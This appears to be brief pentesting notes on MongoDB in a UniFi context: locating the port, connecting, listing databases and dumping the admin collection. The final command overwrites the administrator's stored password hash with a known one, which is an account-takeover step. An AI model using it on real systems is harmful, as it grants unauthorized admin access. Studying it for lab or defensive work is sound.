Get information about the port that it is running (Default Ports: 27017, 27018)
```
cat /etc/mongodb.conf | grep port
```
Simply run "mongo" to get version

Access Mongo via Command Line (custom port)
```
mongo --host 127.0.0.1 --port 27117
```

To show Databases simply run:
```
show dbs
```
Then just simply do "use admin" 

Show collections:
```
show collections
```

Useful collections to investigate include: (IN a Unifi context)
```
db.admin.find().limit(5)
```

Update a record: (also works with only update())
```
db.admin.updateOne(
    { name: "administrator" },
    { $set: { x_shadow: "$6$tKC74lG8OxJYZAsB$6Pz40iWaO5B9eZ6L58AbnaM1o0qevZ7yjoLIPAHoQqtWni2K4Eydf2gsYV9SRwbuFvQP4.nQs1X1H0BrkUsdq1" } }
)
```

More info on pentesting a mongodb: https://hackviser.com/tactics/pentesting/services/MongoDB#nosql-injection